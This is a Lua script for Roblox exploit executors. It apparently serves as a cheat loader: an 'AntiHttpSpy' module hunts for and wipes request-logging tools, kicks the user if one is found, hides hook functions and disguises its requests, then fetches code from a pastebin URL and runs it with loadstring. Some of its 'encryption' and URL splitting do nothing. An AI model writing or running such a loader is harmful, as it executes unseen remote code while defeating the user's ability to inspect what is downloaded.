local AntiHttpSpy = {}
AntiHttpSpy.__index = AntiHttpSpy
AntiHttpSpy.Version = "0"
AntiHttpSpy.Protected = false
AntiHttpSpy.KickOnDetection = true

function AntiHttpSpy:KickPlayer(reason)
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    if LocalPlayer then
        pcall(function()
            LocalPlayer:Kick("不要使用httpspy")
        end)
        
        while true do
            error("不要使用httpspy" .. reason)
        end
    end
end

function AntiHttpSpy:DetectHttpSpyPresence()
    local spyDetected = false
    local detectionReasons = {}
    
    for key, value in pairs(_G) do
        local keyLower = tostring(key):lower()
        if keyLower:find("httpspy") or keyLower:find("requestlog") or keyLower:find("httplog") then
            spyDetected = true
            table.insert(detectionReasons, "_G." .. tostring(key))
        end
    end
    
    for key, value in pairs(shared) do
        local keyLower = tostring(key):lower()
        if keyLower:find("httpspy") or keyLower:find("requestlog") or keyLower:find("httplog") then
            spyDetected = true
            table.insert(detectionReasons, "shared." .. tostring(key))
        end
    end
    
    if getgenv then
        local genv = getgenv()
        for key, value in pairs(genv) do
            local keyLower = tostring(key):lower()
            if keyLower:find("httpspy") or keyLower:find("requestlog") or keyLower:find("httplog") then
                spyDetected = true
                table.insert(detectionReasons, "getgenv()." .. tostring(key))
            end
        end
    end
    
    local commonSpyVars = {
        "_G.HttpSpy",
        "_G.HTTPSPY",
        "_G.HttpSpyLoaded",
        "_G.httplog",
        "_G.requestlog",
        "shared.HttpSpy",
        "shared.httplog"
    }
    
    for _, varName in ipairs(commonSpyVars) do
        local success, value = pcall(function()
            return loadstring("return " .. varName)()
        end)
        
        if success and value ~= nil then
            spyDetected = true
            table.insert(detectionReasons, varName)
        end
    end
    
    return spyDetected, detectionReasons
end

local function getExecutor()
    if syn then return "Synapse X", syn.request
    elseif KRNL_LOADED then return "KRNL", request
    elseif OXYGEN_LOADED then return "Oxygen U", http.request
    elseif SENTINEL_V2 then return "Sentinel", http_request
    elseif getexecutorname then return getexecutorname(), request
    else return "Unknown", request or http_request or http.request
    end
end

function AntiHttpSpy:DeepClean()
    local spyPatterns = {
        "_G.HttpSpy", "_G.HTTPSPY", "_G.HttpSpyLoaded",
        "_G.httplog", "_G.requestlog", "_G.HTTPSpy",
        "_G.RequestLogger", "_G.HttpLogger",
        
        "shared.HttpSpy", "shared.HTTPSPY",
        "shared.requestlog", "shared.httplog"
    }
    
    for key, _ in pairs(_G) do
        local keyLower = tostring(key):lower()
        if keyLower:find("httpspy") or keyLower:find("requestlog") or keyLower:find("httplog") then
            _G[key] = nil
        end
    end
    
    for key, _ in pairs(shared) do
        local keyLower = tostring(key):lower()
        if keyLower:find("httpspy") or keyLower:find("requestlog") or keyLower:find("httplog") then
            shared[key] = nil
        end
    end
    
    if getgenv then
        local genv = getgenv()
        for key, _ in pairs(genv) do
            local keyLower = tostring(key):lower()
            if keyLower:find("httpspy") or keyLower:find("requestlog") or keyLower:find("httplog") then
                genv[key] = nil
            end
        end
    end
    
    if getrenv then
        local renv = getrenv()
        for key, _ in pairs(renv) do
            local keyLower = tostring(key):lower()
            if keyLower:find("httpspy") or keyLower:find("requestlog") or keyLower:find("httplog") then
                renv[key] = nil
            end
        end
    end
end

function AntiHttpSpy:DeepCleanAndCheck()
    if self.KickOnDetection then
        local detected, reasons = self:DetectHttpSpyPresence()
        if detected then
            local reasonText = "HttpSpy detected in: " .. table.concat(reasons, ", ")
            self:KickPlayer(reasonText)
            return false
        end
    end
    
    self:DeepClean()
    return true
end

function AntiHttpSpy:DetectHooks()
    local suspiciousHooks = {}
    
    local hookFunctions = {
        "hookfunction", "hookmetamethod", "newcclosure",
        "replaceclosure", "clonefunction", "detourhook"
    }
    
    for _, funcName in ipairs(hookFunctions) do
        if _G[funcName] ~= nil then
            table.insert(suspiciousHooks, funcName)
        end
    end
    
    return #suspiciousHooks > 0, suspiciousHooks
end

function AntiHttpSpy:SaveOriginalFunctions()
    self.OriginalFunctions = {}
    
    local executor, requestFunc = getExecutor()
    
    if requestFunc then
        self.OriginalFunctions.request = requestFunc
    end
    
    if syn and syn.request then
        self.OriginalFunctions.syn_request = syn.request
    end
    
    if http and http.request then
        self.OriginalFunctions.http_request = http.request
    end
    
    if http_request then
        self.OriginalFunctions.http_request_global = http_request
    end
    
    if clonefunction then
        for name, func in pairs(self.OriginalFunctions) do
            self.OriginalFunctions[name] = clonefunction(func)
        end
    end
end

function AntiHttpSpy:AntiDebug()
    local debugChecks = {
        function() return debug.getinfo ~= nil and debug.traceback ~= nil end,
        function() return getloadedmodules ~= nil end,
        function() return getcallingscript ~= nil end,
        function() return checkcaller ~= nil end
    }
    
    for _, check in ipairs(debugChecks) do
        local success, result = pcall(check)
        if success and result then
            return true
        end
    end
    
    return false
end

local Encryption = {}

function Encryption:XOR(input, key)
    local output = {}
    local keyLen = #key
    
    for i = 1, #input do
        local byte = string.byte(input, i)
        local keyByte = string.byte(key, (i - 1) % keyLen + 1)
        table.insert(output, string.char(bit32.bxor(byte, keyByte)))
    end
    
    return table.concat(output)
end

function Encryption:Base64Encode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    return ((data:gsub('.', function(x) 
        local r, b = '', x:byte()
        for i = 8, 1, -1 do 
            r = r .. (b % 2^i - b % 2^(i-1) > 0 and '1' or '0') 
        end
        return r
    end) .. '0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
        if #x < 6 then return '' end
        local c = 0
        for i = 1, 6 do 
            c = c + (x:sub(i,i) == '1' and 2^(6-i) or 0) 
        end
        return b:sub(c+1, c+1)
    end) .. ({ '', '==', '=' })[#data % 3 + 1])
end

function Encryption:Base64Decode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if x == '=' then return '' end
        local r, f = '', (b:find(x) - 1)
        for i = 6, 1, -1 do 
            r = r .. (f % 2^i - f % 2^(i-1) > 0 and '1' or '0') 
        end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c = 0
        for i = 1, 8 do 
            c = c + (x:sub(i,i) == '1' and 2^(8-i) or 0) 
        end
        return string.char(c)
    end))
end

function Encryption:MultiLayerEncrypt(data, key)
    local layer1 = self:XOR(data, key)
    local layer2 = self:Base64Encode(layer1)
    local layer3 = self:XOR(layer2, key:reverse())
    return self:Base64Encode(layer3)
end

function Encryption:MultiLayerDecrypt(data, key)
    local layer1 = self:Base64Decode(data)
    local layer2 = self:XOR(layer1, key:reverse())
    local layer3 = self:Base64Decode(layer2)
    return self:XOR(layer3, key)
end

AntiHttpSpy.Encryption = Encryption

function AntiHttpSpy:GetSecureRequestFunction()
    local requestFunctions = {
        {name = "syn.request", func = syn and syn.request},
        {name = "http.request", func = http and http.request},
        {name = "http_request", func = http_request},
        {name = "request", func = request},
    }
    
    if self.OriginalFunctions then
        if self.OriginalFunctions.syn_request then
            return self.OriginalFunctions.syn_request
        end
        if self.OriginalFunctions.request then
            return self.OriginalFunctions.request
        end
    end
    
    for _, reqFunc in ipairs(requestFunctions) do
        if reqFunc.func and type(reqFunc.func) == "function" then
            return reqFunc.func
        end
    end
    
    return nil
end

function AntiHttpSpy:SecureRequest(options)
    if not options or type(options) ~= "table" then
        error("Invalid request options")
    end
    
    if not options.Url or type(options.Url) ~= "string" then
        error("Invalid URL")
    end
    
    if not self:DeepCleanAndCheck() then
        return nil
    end
    
    local hasHooks, hooks = self:DetectHooks()
    if hasHooks then
    end
    
    local requestFunc = self:GetSecureRequestFunction()
    if not requestFunc then
        error("No HTTP request function available")
    end
    
    local success, response = pcall(function()
        local savedHooks = {}
        local hookNames = {"hookfunction", "hookmetamethod", "newcclosure"}
        
        for _, hookName in ipairs(hookNames) do
            if _G[hookName] then
                savedHooks[hookName] = _G[hookName]
                _G[hookName] = nil
            end
        end
        
        local result = requestFunc(options)
        
        for hookName, hookFunc in pairs(savedHooks) do
            _G[hookName] = hookFunc
        end
        
        return result
    end)
    
    if not success then
        error("Request failed: " .. tostring(response))
    end
    
    return response
end

function AntiHttpSpy:StealthRequest(options)
    task.wait(math.random(100, 500) / 1000)
    
    local originalUrl = options.Url
    local urlParts = {}
    
    for i = 1, #originalUrl, 15 do
        table.insert(urlParts, originalUrl:sub(i, math.min(i + 14, #originalUrl)))
    end
    
    options.Url = table.concat(urlParts)
    
    local userAgents = {
        "Roblox/WinInet",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "RobloxStudio/WinInet",
    }
    
    if not options.Headers then
        options.Headers = {}
    end
    
    options.Headers["User-Agent"] = userAgents[math.random(1, #userAgents)]
    options.Headers["Cache-Control"] = "no-cache"
    
    return self:SecureRequest(options)
end

function AntiHttpSpy:SecureHttpGet(url)
    local response = self:StealthRequest({
        Url = url,
        Method = "GET"
    })
    
    if response and response.StatusCode == 200 then
        return response.Body
    else
        error("HttpGet failed for URL: " .. url)
    end
end

function AntiHttpSpy:EncryptedRequest(url, method, body, key)
    key = key or "DefaultSecureKey123!@#"
    
    local encryptedUrl = self.Encryption:MultiLayerEncrypt(url, key)
    
    local encryptedBody = nil
    if body then
        encryptedBody = self.Encryption:MultiLayerEncrypt(
            game:GetService("HttpService"):JSONEncode(body), 
            key
        )
    end
    
    local decryptedUrl = self.Encryption:MultiLayerDecrypt(encryptedUrl, key)
    
    local options = {
        Url = decryptedUrl,
        Method = method or "GET",
        Headers = {
            ["Content-Type"] = "application/json",
            ["X-Encrypted"] = "true"
        }
    }
    
    if encryptedBody then
        local decryptedBody = self.Encryption:MultiLayerDecrypt(encryptedBody, key)
        options.Body = decryptedBody
    end
    
    return self:StealthRequest(options)
end

function AntiHttpSpy:BatchRequest(requests)
    local responses = {}
    
    for i, req in ipairs(requests) do
        local randomDelay = math.random(50, 200) / 1000
        task.wait(randomDelay)
        
        local success, response = pcall(function()
            return self:SecureRequest(req)
        end)
        
        if success then
            responses[i] = response
        else
            responses[i] = {
                Success = false,
                Error = response
            }
        end
    end
    
    return responses
end

function AntiHttpSpy:Initialize()
    if self.Protected then
        return self
    end
    
    local detected, reasons = self:DetectHttpSpyPresence()
    if detected then
        if self.KickOnDetection then
            self:KickPlayer("HttpSpy detected on initialization: " .. table.concat(reasons, ", "))
            return nil
        end
    end
    
    self:DeepClean()
    
    self:SaveOriginalFunctions()
    
    local executor, _ = getExecutor()
    
    local hasHooks, hooks = self:DetectHooks()
    if hasHooks then
    else
    end
    
    if self:AntiDebug() then
    else
    end
    
    self.Protected = true
    
    return self
end

function AntiHttpSpy:StartContinuousProtection()
    task.spawn(function()
        while self.Protected do
            task.wait(5)
            
            local detected, reasons = self:DetectHttpSpyPresence()
            if detected then
                if self.KickOnDetection then
                    self:KickPlayer("HttpSpy detected during runtime: " .. table.concat(reasons, ", "))
                    break
                end
            end
            
            self:DeepClean()
            
            local hasHooks, hooks = self:DetectHooks()
            if hasHooks then
            end
        end
    end)
    
end

local Protection = AntiHttpSpy:Initialize()

if not Protection then
    error("Protection initialization failed - HttpSpy detected")
end

Protection:StartContinuousProtection()

_ZOUMAGUANHUAGUI = '走马观花X'

local scriptUrl = "https://pastebin.com/raw/XPTiVKWx"
local scriptCode = Protection:SecureHttpGet(scriptUrl)

loadstring(scriptCode)()